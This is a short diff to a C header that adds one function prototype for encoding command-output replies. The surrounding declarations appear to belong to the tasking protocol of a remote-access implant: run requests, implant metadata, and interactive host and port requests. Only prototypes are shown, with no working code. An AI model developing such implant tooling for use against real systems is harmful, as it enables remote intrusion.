@@ -77,6 +77,7 @@ void decode_header(const uint8_t *buf, task_header_t *out);
 void encode_run_req(const char *cmd, uint8_t *out, int *out_len);
 void decode_run_req(const uint8_t *buf, int buf_len, char *out_cmd, int max_len);
 void encode_run_rep(const char *output, uint8_t *out, int *out_len);
+void encode_run_rep_len(const char *output, uint32_t output_len, uint8_t *out, int *out_len);
 void encode_metadata(const implant_metadata_t *meta, uint8_t *out, int *out_len);
 int parse_interactive_req(const uint8_t *buf, int buf_len,
                           char *out_host, int max_host, uint16_t *out_port);
